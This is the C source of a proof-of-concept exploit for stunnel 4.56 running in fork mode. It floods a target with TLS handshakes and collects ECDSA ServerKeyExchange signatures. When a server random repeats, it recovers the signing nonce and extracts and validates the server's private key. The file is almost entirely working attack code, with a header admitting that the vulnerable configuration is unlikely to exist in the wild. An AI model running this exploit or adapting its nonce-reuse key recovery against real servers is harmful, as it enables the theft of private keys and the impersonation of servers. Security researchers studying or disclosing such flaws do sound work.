/* stunnel 4.56 - fork key stealing proof of concept
 * (c)2014 Aris Adamantiadis <aris@badcode.be>
 * This exploit will only work on Stunnel compiled in fork mode
 * with openbsd, on a combination of openssl version that probably
 * doesn't exist in the wild.
 */

#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <netdb.h>
#include <fcntl.h>
#include <signal.h>
#include <unistd.h>
#include <string.h>
#include <sched.h>
#include <pthread.h>
#include <openssl/ssl.h>
#include <openssl/err.h>
#include <openssl/rand.h>
#include <openssl/x509.h>
#include <openssl/sha.h>
#include <assert.h>

#define HOST	"localhost"

#define PORT	443

#define NSESSIONS 1000
#define COOKIELEN 32
#define NTHREADS 1

char *host=HOST;
int port=PORT;
int verbose;
int counter=0;
volatile int found = 0;

//#define FIPS
#ifdef FIPS
#define HASH_CTX SHA_CTX
#define HASH_Init SHA1_Init
#define HASH_Update SHA1_Update
#define HASH_Final SHA1_Final
#define HASH_DIGEST_LENGTH SHA_DIGEST_LENGTH
#else
#define HASH_CTX SHA512_CTX
#define HASH_Init SHA512_Init
#define HASH_Update SHA512_Update
#define HASH_Final SHA512_Final
#define HASH_DIGEST_LENGTH SHA512_DIGEST_LENGTH
#endif

/* required stuff for openssl threadsafety */
static pthread_mutex_t *lock_cs;

static unsigned long id_function(void)
{
	return ((unsigned long) pthread_self());
}

static void locking_function(int mode, int type, const char *file, int line)
{
	if (mode & CRYPTO_LOCK) {
		pthread_mutex_lock(&lock_cs[type]);
	} else {
		pthread_mutex_unlock(&lock_cs[type]);
	}
}

static void ssl_thread_setup(void)
{
	int num = CRYPTO_num_locks();
	int ctr;

	lock_cs = (pthread_mutex_t*) OPENSSL_malloc(num * sizeof(pthread_mutex_t));

	for (ctr = 0; ctr < num; ctr++) {
		pthread_mutex_init(&lock_cs[ctr], NULL);
	}

	CRYPTO_set_id_callback(id_function);
	CRYPTO_set_locking_callback(locking_function);
}

/* global token table */
struct cache {
	uint8_t servercookie[COOKIELEN];
	uint8_t payload[HASH_DIGEST_LENGTH];
	size_t siglen;
	uint8_t signature[100];
};

EC_KEY *server_pkey = NULL;
struct cache session_cache[NSESSIONS];
int nsessions=0;
int sessionsptr=0;

pthread_rwlock_t lock = PTHREAD_RWLOCK_INITIALIZER;

int add_session(unsigned char cookie[COOKIELEN], uint8_t payload[HASH_DIGEST_LENGTH], size_t siglen, uint8_t *signature){
	struct cache *p;
	int rc;
	if (pthread_rwlock_wrlock(&lock) != 0) {
		perror("pthread_rwlock_wrlock");
		exit(-1);
	}
	rc = sessionsptr;
	p=&session_cache[sessionsptr];
	memcpy(p->servercookie,cookie,COOKIELEN);
	memcpy(p->payload, payload, HASH_DIGEST_LENGTH);
	p->siglen = siglen;
	assert(siglen <= 100);
	memcpy(p->signature, signature, siglen);
	sessionsptr++;
	if(sessionsptr >= NSESSIONS)
		sessionsptr=0;
	nsessions++;
	if(nsessions >= NSESSIONS)
		nsessions=NSESSIONS;
	if (pthread_rwlock_unlock(&lock) != 0) {
		perror("pthread_rwlock_unlock");
		exit(-1);
	}
	return rc;
}

int check_session(uint8_t cookie[COOKIELEN]){
	int i;
	int rc = -1;
	if (pthread_rwlock_rdlock(&lock) != 0) {
		perror("pthread_rwlock_rdlock");
		exit(-1);
	}

	for(i=0;i<nsessions;++i){
		if(memcmp(session_cache[i].servercookie,cookie,COOKIELEN)==0){
			printf("Found ! hash %d\n", counter);
			found = 1;
			rc = i;
			break;
		}
	}
	if (pthread_rwlock_unlock(&lock) != 0) {
		perror("pthread_rwlock_unlock");
		exit(-1);
	}

	return rc;
}

extern BIO *bio_err;

void print_hexa(const char *title, unsigned char *buffer, int len){
	int i;
	static pthread_mutex_t mlock = PTHREAD_MUTEX_INITIALIZER;
	pthread_mutex_lock(&mlock);
	printf("%s: ", title);
	for(i=0;i<len;++i){
		if(i % 8 == 0 && i > 0)
			printf(" ");
		if(i % 32 == 0 && i > 0)
			printf("\n");
		printf("%.2hhx",buffer[i]);
	}
	printf("\n");
	pthread_mutex_unlock(&mlock);
}

void bnprint(const char *name, const BIGNUM *b) {
        unsigned char *tmp;
        int len;
        len = BN_num_bytes(b);
        tmp = malloc(len);
        BN_bn2bin(b, tmp);
        print_hexa(name, tmp, len);
        free(tmp);
}

int tcp_connect(const char *host, int port){
	struct hostent *hp;
	struct sockaddr_in addr;
	int sock;

	if(!(hp=gethostbyname(host))){
		printf ("Couldn't resolve host %s\n", host);
		return -1;
	}

	memset(&addr,0,sizeof(addr));
	addr.sin_addr=*(struct in_addr*) hp->h_addr_list[0];
	addr.sin_family=AF_INET;
	addr.sin_port=htons(port);

	sock=socket(AF_INET,SOCK_STREAM, IPPROTO_TCP);
	if(connect(sock,(struct sockaddr *)&addr, sizeof(addr))<0){
		perror("Connecting socket");
		close(sock);
		return -1;
	}

	return sock;
}

struct __attribute__((packed)) record_h {
	uint8_t type;
	uint16_t version;
	uint16_t len;
};

struct __attribute__ ((packed)) handshake_h{
	uint8_t type;
	uint8_t padding;
	uint16_t len;
};

struct __attribute__ ((packed)) serverhello {
	struct record_h record;
	struct handshake_h handshake;
	uint16_t version;
	uint8_t server_random[32];
	uint8_t session_id_len;
	uint16_t cipher_suite;
	uint8_t compression_method;
	uint16_t extensions_len;
};

struct __attribute__ ((packed)) certificate {
	struct record_h record;
	struct handshake_h handshake;
	uint8_t padding;
	uint16_t certs_len;
};

struct __attribute__ ((packed)) key_exchange {
	struct record_h record;
	struct handshake_h handshake;
	struct __attribute__((packed)) {
		uint8_t curvetype;
		uint16_t namedcurve;
	} ecparameters;
};

struct __attribute__((packed)) clienthello  {
	struct record_h record;
	struct handshake_h handshake;
	/* client hello */
	struct __attribute__((packed)){
		uint16_t version;
		uint8_t client_random[32];
		uint8_t sessionid_len;
		uint16_t ciphersuite_len;
		uint16_t ciphersuites[80];
		uint8_t comp_len;
		uint8_t comp_methods[1];
		uint16_t extensions_len;
		uint8_t extensions[109];
	} clienthello;
};

BIO *bio_err=0;

/* Print SSL errors and exit*/
int berr_exit(const char *string){
	BIO_printf(bio_err,"%s\n",string);
	ERR_print_errors(bio_err);
	exit(1);
}

SSL_CTX *initialize_ctx() {
	const SSL_METHOD *meth;
	SSL_CTX *ctx;

	/* Create our context*/
	meth=SSLv23_method();
	ctx=SSL_CTX_new(meth);

#if (OPENSSL_VERSION_NUMBER < 0x00905100L)
	SSL_CTX_set_verify_depth(ctx,1);
#endif

	return ctx;
}

/* courtesy wireshark */

const char ciphersuites[]=
		"\xc0\x30\xc0\x2c\xc0\x28\xc0\x24\xc0\x14\xc0\x0a\xc0\x22\xc0\x21\x00"
		"\xa3\x00\x9f\x00\x6b\x00\x6a\x00\x39\x00\x38\x00\x88\x00\x87\xc0\x32"
		"\xc0\x2e\xc0\x2a\xc0\x26\xc0\x0f\xc0\x05\x00\x9d\x00\x3d\x00\x35\x00"
		"\x84\xc0\x12\xc0\x08\xc0\x1c\xc0\x1b\x00\x16\x00\x13\xc0\x0d\xc0\x03\x00"
		"\x0a\xc0\x2f\xc0\x2b\xc0\x27\xc0\x23\xc0\x13\xc0\x09\xc0\x1f\xc0\x1e\x00"
		"\xa2\x00\x9e\x00\x67\x00\x40\x00\x33\x00\x32\x00\x9a\x00\x99\x00"
		"\x45\x00\x44\xc0\x31\xc0\x2d\xc0\x29\xc0\x25\xc0\x0e\xc0\x04\x00"
		"\x9c\x00\x3c\x00\x2f\x00\x96\x00\x41\x00\x07\xc0\x11\xc0\x07\xc0"
		"\x0c\xc0\x02\x00\x05\x00\x04\x00\x15\x00\x12\x00\x09\x00\x14\x00"
		"\x11\x00\x08\x00\x06\x00\x03\x00\xff";
const char extensions[]=
		/* ec_point_formats */
		"\x00\x0b\x00\x04\x03\x00\x01\x02"
		/* elliptic_curves */
		"\x00\x0a\x00\x34\x00\x32\x00\x0e\x00\x0d\x00\x19\x00\x0b\x00\x0c\x00\x18"
		"\x00\x09\x00\x0a\x00\x16\x00\x17\x00\x08\x00\x06\x00\x07\x00\x14\x00\x15"
		"\x00\x04\x00\x05\x00\x12\x00\x13\x00\x01\x00\x02\x00\x03\x00\x0f\x00\x10"
		"\x00\x11"
		/* sessionticket TLS */
		"\x00\x23\x00\x00"
		/* signature_algorithms */
		"\x00\x0d\x00\x20\x00\x1e\x06\x01\x06\x02\x06\x03\x05\x01\x05\x02\x05\x03"
		"\x04\x01\x04\x02\x04\x03\x03\x01\x03\x02\x03\x03\x02\x01\x02\x02\x02\x03"
		/* heartbeat */
		"\x00\x0f\x00\x01\x01";


void crack_key(int session1, int session2){
	struct cache *s1, *s2;
	ECDSA_SIG *sig1, *sig2;
	const uint8_t *sig1p, *sig2p;
	BIGNUM *m1, *m2;
	BIGNUM *order;
	BIGNUM *tmp1, *tmp2;
	BIGNUM *k,*privkey;
	const EC_GROUP *curve;
	BN_CTX *ctx;
	int rc, i, payload_len = HASH_DIGEST_LENGTH;
	
	s1=&session_cache[session1];
	s2=&session_cache[session2];
	
	if (memcmp(s1->servercookie, s2->servercookie, 32)!=0){
		printf("Server cookies are not identical :(\n");
		return;
	}
	if(s1->siglen != s2->siglen || memcmp(s1->signature, s2->signature, s1->siglen) != 0)
		printf("Signatures are different, excellent !\n");
	else {
		printf("Signatures are the same :(\n");
		return;
	}

	ctx = BN_CTX_new();
	BN_CTX_start(ctx);
	order = BN_CTX_get(ctx);
	m1 = BN_CTX_get(ctx);
	m2 = BN_CTX_get(ctx);
	tmp1 = BN_CTX_get(ctx);
	tmp2 = BN_CTX_get(ctx);
	k = BN_CTX_get(ctx);
	privkey = BN_CTX_get(ctx);

	curve = EC_KEY_get0_group(server_pkey);
	EC_GROUP_get_order(curve, order, ctx);
        sig1 = ECDSA_SIG_new();
        sig2 = ECDSA_SIG_new();
	sig1p = s1->signature;
	sig2p = s2->signature;
        if (d2i_ECDSA_SIG(&sig1, &sig1p, s1->siglen) == NULL){
		printf ("Signature parsing error\n");
		return;
	}
        if (d2i_ECDSA_SIG(&sig2, &sig2p, s2->siglen) == NULL){
		printf ("Signature parsing error\n");
		return;
	}
	/* convert the digests into m messages */
	i = BN_num_bits(order);
	/* Need to truncate digest if it is too long: first truncate whole
         * bytes.
         */
	if (8 * payload_len > i)
		payload_len = (i + 7)/8;
	BN_bin2bn(s1->payload, payload_len, m1);
	BN_bin2bn(s2->payload, payload_len, m2);

	/* if i is not an exact multiple of 8 */
	if (8 * payload_len > i){
		BN_rshift(m1, m1, 8 - (i & 0x7));
		BN_rshift(m2, m2, 8 - (i & 0x7));
	}
	bnprint("m1", m1);
	bnprint("m2", m2);
	/* k (m1 - m2) * (s1 - s2)^-1 (mod order)*/
	BN_mod_sub(tmp1, m1, m2, order, ctx);
	BN_mod_sub(tmp2, sig1->s, sig2->s, order, ctx);
	BN_mod_inverse(tmp2, tmp2, order, ctx);
	BN_mod_mul(k, tmp1, tmp2, order, ctx);
	bnprint("k",k);

	/* dA = (s*k - m1) * r^-1  (mod order) */
	BN_mod_mul(tmp1, sig1->s, k, order, ctx);
	BN_mod_sub(tmp1, tmp1, m1, order, ctx);
	BN_mod_inverse(tmp2, sig1->r, order, ctx);
	BN_mod_mul(privkey, tmp1, tmp2, order, ctx);

	bnprint("privkey",privkey);
	/* check if the privkey is good */
	rc = EC_KEY_set_private_key(server_pkey, privkey);
	if (rc != 1){
		printf("Error setting private key\n");
		return;
	}
	rc = EC_KEY_check_key(server_pkey);
	if (rc == 1){
		printf("Private key extracted !\n");
	} else {
		printf("Extracted private key invalid :(\n");
		return;
	}
}

static void *mainthread(void *unused){
	//SSL_CTX *ctx;
	//SSL *ssl;
	//BIO *sbio;
	int sock;
	struct clienthello hello;
	//int s_server_session_id_context = 1;
	uint8_t buffer[1600];
	uint8_t *p;
	struct serverhello *shello;
	struct certificate *cert;
	struct key_exchange *kex;
	HASH_CTX sha512;
	size_t param_len;
	uint8_t sigbuf[HASH_DIGEST_LENGTH];
	int rc,s1,s2;
	X509 *x509;
	EVP_PKEY *pkey;
	do {

		sock=tcp_connect(host,port);
		if(sock < 0)
			return NULL;
		hello.record.type = 0x16; /* handshake */
		hello.record.version = htons(0x301); /* TLS 1.0 */
		hello.record.len = htons(314);
		hello.handshake.type = 0x01; /* client hello */
		hello.handshake.padding = 0;
		hello.handshake.len = htons(310);
		hello.clienthello.version = htons(0x0303); /* TLS 1.2 */
		*(unsigned int *)hello.clienthello.client_random = htonl(time(NULL));
		RAND_bytes(&hello.clienthello.client_random[4], 28);
		//memset(&hello.clienthello.client_random[4], 0, 28);
		hello.clienthello.sessionid_len = 0;
		hello.clienthello.ciphersuite_len = htons(160);
		memcpy (hello.clienthello.ciphersuites, ciphersuites, 160);
		hello.clienthello.comp_len = 0x01;
		hello.clienthello.comp_methods[0] = 0x00; /*comp_null */
		hello.clienthello.extensions_len = htons(109);
		memcpy(hello.clienthello.extensions, extensions, 109);
		send(sock,&hello, sizeof(hello), 0);
		recv(sock, &buffer, sizeof(buffer), 0);


		shello = (struct serverhello *) &buffer;
		/* handshake */
		if(shello->record.type != 0x16){
			goto err;
		}
		/* serverhello */
		if(shello->handshake.type != 0x2){
			goto err;
		}
		print_hexa("server random", shello->server_random, 32);
#ifdef FIPS
		/* Cipher Suite: TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA (0xc00a) */
		if(ntohs(shello->cipher_suite) !=  0xc00a){
#else
		/* Cipher Suite: TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384 (0xc02c) */
		if(ntohs(shello->cipher_suite) != 0xc02c){
#endif
		printf("Bad cipher suite %x\n", ntohs(shello->cipher_suite));
		goto err;
	}

		cert = (struct certificate *) ((uint8_t *)shello + ntohs(shello->record.len) + 5);
		/* handshake */
		if(cert->record.type != 0x16){
			goto err;
		}
		/* certificate */
		if(cert->handshake.type != 0xb)
			goto err;
		if(!server_pkey){
			pthread_rwlock_wrlock(&lock);
			if(verbose)
				print_hexa("certificate", (uint8_t *)&cert[1], ntohs(cert->certs_len));
			p = ((uint8_t *)&cert[1]) + 3; /* skip len */
			x509 = d2i_X509(NULL, (const unsigned char **)&p, ntohs(cert->certs_len) - 3);
			if(x509 == NULL){
				printf ("invalid certificate\n");
				goto err;
			} 
			pkey = X509_get_pubkey(x509);
			server_pkey = EVP_PKEY_get1_EC_KEY(pkey);
			pthread_rwlock_unlock(&lock);
		}	
		kex = (struct key_exchange *) ((uint8_t *)cert + ntohs(cert->record.len) + 5);

		if(kex->record.type != 0x16)
			goto err;
		/* server key exchange */
		if(kex->handshake.type != 0xc)
			goto err;
		if(kex->ecparameters.curvetype != 3)
			goto err;
		if(verbose)
			print_hexa("key exchange", (uint8_t *)&kex->ecparameters, ntohs(kex->handshake.len));
		if(verbose)
			printf("Curve : %d\n",ntohs(kex->ecparameters.namedcurve));
		if(ntohs(kex->ecparameters.namedcurve)!= 23){
			printf("only secp256 is supported (23)\n");
			goto err;
		}
		size_t len = ntohs(kex->handshake.len) - 3;
		p = ((uint8_t *)&kex[1]);
		if(verbose){
			printf("point len: %d\n",p[0]);
			print_hexa("point", (uint8_t*)p+1, p[0]);
		}
		param_len = 3 + p[0] + 1;
		len -= p[0] +1;
		p += p[0] +1;
		
		/* don't know why this */
		//p += 2;
		//len -= 2;
		if(verbose)
			printf("Remaining len (signature): %d\n",len);
		if(verbose)
			print_hexa("signature",p,len);
#ifndef FIPS
		/* mode also gives the hash type */
		if(verbose)
			printf("curve %d, hash %d\n",p[1],p[0]);
		if(p[0] != 6){
			printf("only SHA512 (6) supported\n");
			goto err;
		}
		/* hash 6 = SHA512 */
		p+= 2;
		len -= 2;
#endif
		if ((p[0] << 8) + p[1] != len-2){
			printf ("wrong len %d, true len = %d\n", (p[0] << 8) + p[1], len-2);
			goto err;
		}
		p+=2;
		len -=2;
		HASH_Init(&sha512);
		HASH_Update(&sha512, hello.clienthello.client_random, 32);
		HASH_Update(&sha512, shello->server_random, 32);
		HASH_Update(&sha512, &kex->ecparameters, param_len);
		HASH_Final(sigbuf, &sha512);
		rc=ECDSA_verify(0, sigbuf, HASH_DIGEST_LENGTH, p, len, server_pkey);
		if(rc != 1)
			printf("Verify failed\n");
		else if(verbose)
			printf("Verify success\n");
		s1 = check_session(shello->server_random);
		s2 = add_session(shello->server_random, sigbuf, len, p);
		if(s1 >=0)
			crack_key(s1, s2);

		counter++;
		close(sock);
	} while(found == 0);
	//printf("Exiting thread\n");
	return NULL;
err:
	printf("parsing error\n");
	return NULL;
}

int main(int argc, char **argv) {
	int c,i;
	pthread_t threads[NTHREADS];

	while((c=getopt(argc,argv,"h:p:v"))!=-1){
		switch(c){
		case 'h':
			host=strdup(optarg);
			break;
		case 'p':
			port=atoi(optarg);
			if(port <=0 || port > 65535){
				printf("%s invalid port number\n", optarg);
				exit(1);
			}
			break;
		case 'v':
			verbose++;
		}
	}
	printf("Exploiting %s:%d\n", host, port);
	signal(SIGPIPE,SIG_IGN);
	ssl_thread_setup();
	if(!bio_err){
		/* Global system initialization*/
		SSL_library_init();
		SSL_load_error_strings();

		/* An error write context */
		bio_err=BIO_new_fp(stderr,BIO_NOCLOSE);
	}

	for (i=0;i<NTHREADS;++i){
		pthread_create(&threads[i], NULL, mainthread, NULL);
	}
	for (i=0;i<NTHREADS;++i){
		pthread_join(threads[i], NULL);
	}
	//while (!found)
	//	sleep(1);
	printf("Counter : %d\n", counter);
	return 0;
}
